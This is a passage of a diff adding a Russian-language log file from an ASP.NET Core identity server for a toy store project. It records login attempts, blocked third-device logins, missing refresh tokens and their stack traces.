+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:12:28.872 +05:00 [WRN] Ошибка 403: Неверный пароль. | Path: /auth/login
+2025-05-10 20:12:28.888 +05:00 [INF] HTTP POST /auth/login responded 403 in 650.2890 ms
+2025-05-10 20:12:50.892 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.3272 ms
+2025-05-10 20:12:51.119 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 20:12:51.254 +05:00 [FTL] Обнаружена попытка входа с третьего устройства. Возможная компрометация аккаунта cb32f405-02ab-4933-8703-3c753a33e2ea. Всего активных устройств: 3. Fingerprint: d4537a75a913dee2130d8dedeb57f28c
+2025-05-10 20:12:51.370 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Обнаружено более двух устройств. Возможна компрометация аккаунта.
+   at IdentityServer.Repositories.AuthRepository.SaveRefreshTokenAsync(RefreshToken refreshToken) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Repositories\AuthRepository.cs:line 155
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 142
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:12:51.381 +05:00 [WRN] Ошибка 403: Обнаружено более двух устройств. Возможна компрометация аккаунта. | Path: /auth/login
+2025-05-10 20:12:51.383 +05:00 [INF] HTTP POST /auth/login responded 403 in 488.6573 ms
+2025-05-10 20:12:55.773 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 20:12:55.781 +05:00 [FTL] Обнаружена попытка входа с третьего устройства. Возможная компрометация аккаунта cb32f405-02ab-4933-8703-3c753a33e2ea. Всего активных устройств: 3. Fingerprint: d4537a75a913dee2130d8dedeb57f28c
+2025-05-10 20:12:55.870 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Обнаружено более двух устройств. Возможна компрометация аккаунта.
+   at IdentityServer.Repositories.AuthRepository.SaveRefreshTokenAsync(RefreshToken refreshToken) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Repositories\AuthRepository.cs:line 155
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 142
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:12:55.883 +05:00 [WRN] Ошибка 403: Обнаружено более двух устройств. Возможна компрометация аккаунта. | Path: /auth/login
+2025-05-10 20:12:55.884 +05:00 [INF] HTTP POST /auth/login responded 403 in 266.6886 ms
+2025-05-10 20:12:56.665 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.2082 ms
+2025-05-10 20:12:56.816 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 20:12:56.828 +05:00 [FTL] Обнаружена попытка входа с третьего устройства. Возможная компрометация аккаунта cb32f405-02ab-4933-8703-3c753a33e2ea. Всего активных устройств: 3. Fingerprint: d4537a75a913dee2130d8dedeb57f28c
+2025-05-10 20:12:56.925 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Обнаружено более двух устройств. Возможна компрометация аккаунта.
+   at IdentityServer.Repositories.AuthRepository.SaveRefreshTokenAsync(RefreshToken refreshToken) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Repositories\AuthRepository.cs:line 155
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 142
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:12:56.939 +05:00 [WRN] Ошибка 403: Обнаружено более двух устройств. Возможна компрометация аккаунта. | Path: /auth/login
+2025-05-10 20:12:56.940 +05:00 [INF] HTTP POST /auth/login responded 403 in 271.2724 ms
+2025-05-10 20:13:12.997 +05:00 [INF] HTTP GET /auth/refresh-token responded 405 in 0.3334 ms
+2025-05-10 20:13:12.997 +05:00 [INF] HTTP GET /auth responded 404 in 0.3172 ms
+2025-05-10 20:14:06.213 +05:00 [INF] HTTP OPTIONS /auth/forgot-password responded 204 in 3.7811 ms
+2025-05-10 20:14:07.872 +05:00 [INF] HTTP POST /auth/forgot-password responded 200 in 1654.3435 ms
+2025-05-10 20:14:15.416 +05:00 [INF] HTTP GET /auth responded 404 in 0.3712 ms
+2025-05-10 20:14:15.416 +05:00 [INF] HTTP GET /auth/refresh-token responded 405 in 0.4203 ms
+2025-05-10 20:16:10.154 +05:00 [INF] HTTP GET /auth/refresh-token responded 405 in 0.3973 ms
+2025-05-10 20:16:10.154 +05:00 [INF] HTTP GET /auth responded 404 in 2.0362 ms
+2025-05-10 20:19:23.930 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 1.3994 ms
+2025-05-10 20:19:24.780 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 223
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:19:24.878 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 223
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:19:24.903 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 20:19:24.918 +05:00 [WRN] Ошибка 403: Refresh-токен отсутствует. | Path: /auth/refresh-token
+2025-05-10 20:19:24.919 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 955.4706 ms
+2025-05-10 20:19:24.920 +05:00 [INF] HTTP POST /auth/refresh-token responded 403 in 548.6868 ms
+2025-05-10 20:19:42.445 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.2361 ms
+2025-05-10 20:19:42.664 +05:00 [WRN] Неверный пароль у пользователя sergei05037@gmail.com
+2025-05-10 20:19:42.758 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Неверный пароль.
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 117
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:19:42.770 +05:00 [WRN] Ошибка 403: Неверный пароль. | Path: /auth/login
+2025-05-10 20:19:42.771 +05:00 [INF] HTTP POST /auth/login responded 403 in 316.5227 ms
+2025-05-10 20:20:00.642 +05:00 [INF] HTTP OPTIONS /auth/login responded 204 in 0.3242 ms
+2025-05-10 20:20:00.798 +05:00 [INF] Пользователь admin@atoystore.com успешно вошёл в систему.
+2025-05-10 20:20:00.826 +05:00 [FTL] Обнаружена попытка входа с третьего устройства. Возможная компрометация аккаунта cb32f405-02ab-4933-8703-3c753a33e2ea. Всего активных устройств: 3. Fingerprint: d4537a75a913dee2130d8dedeb57f28c
+2025-05-10 20:20:00.930 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Обнаружено более двух устройств. Возможна компрометация аккаунта.
+   at IdentityServer.Repositories.AuthRepository.SaveRefreshTokenAsync(RefreshToken refreshToken) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Repositories\AuthRepository.cs:line 155
+   at IdentityServer.Services.AuthService.LoginAsync(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 142
+   at IdentityServer.Controllers.AuthController.Login(LoginRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 40
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:20:00.942 +05:00 [WRN] Ошибка 403: Обнаружено более двух устройств. Возможна компрометация аккаунта. | Path: /auth/login
+2025-05-10 20:20:00.943 +05:00 [INF] HTTP POST /auth/login responded 403 in 292.5319 ms
+2025-05-10 20:20:15.453 +05:00 [INF] HTTP OPTIONS /auth/forgot-password responded 204 in 0.1687 ms
+2025-05-10 20:20:16.286 +05:00 [INF] HTTP POST /auth/forgot-password responded 200 in 823.8249 ms
+2025-05-10 20:20:52.529 +05:00 [INF] HTTP OPTIONS /auth/register responded 204 in 0.2083 ms
+2025-05-10 20:20:53.940 +05:00 [INF] HTTP POST /auth/register responded 200 in 1401.4940 ms
+2025-05-10 20:21:51.660 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 0.7603 ms
+2025-05-10 20:21:51.684 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 0.4065 ms
+2025-05-10 20:21:51.883 +05:00 [INF] HTTP POST /auth/refresh-token responded 200 in 145.9867 ms
+2025-05-10 20:21:51.972 +05:00 [INF] HTTP POST /auth/refresh-token responded 200 in 263.6368 ms
+2025-05-10 20:22:36.579 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 2.0091 ms
+2025-05-10 20:22:36.585 +05:00 [INF] HTTP OPTIONS /auth/refresh-token responded 204 in 0.1896 ms
+2025-05-10 20:22:36.704 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 223
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Awaited|17_0(ResourceInvoker invoker, Task task, IDisposable scope)
+   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
+   at Program.<>c.<<<Main>$>b__0_8>d.MoveNext() in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Program.cs:line 221
+--- End of stack trace from previous location ---
+   at Microsoft.AspNetCore.Diagnostics.ExceptionHandlerMiddlewareImpl.<Invoke>g__Awaited|10_0(ExceptionHandlerMiddlewareImpl middleware, HttpContext context, Task task)
+2025-05-10 20:22:36.704 +05:00 [ERR] An unhandled exception has occurred while executing the request.
+System.Security.SecurityException: Refresh-токен отсутствует.
+   at IdentityServer.Services.AuthService.RefreshTokenAsync(String fingerprint) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Services\AuthService.cs:line 223
+   at IdentityServer.Controllers.AuthController.RefreshToken(RefreshTokenRequest request) in C:\Users\Sergey\FinalCut\AToyStore.IdentityServer\IdentityServer\Controllers\AuthController.cs:line 94
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.TaskOfIActionResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
+   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync()
+--- End of stack trace from previous location ---
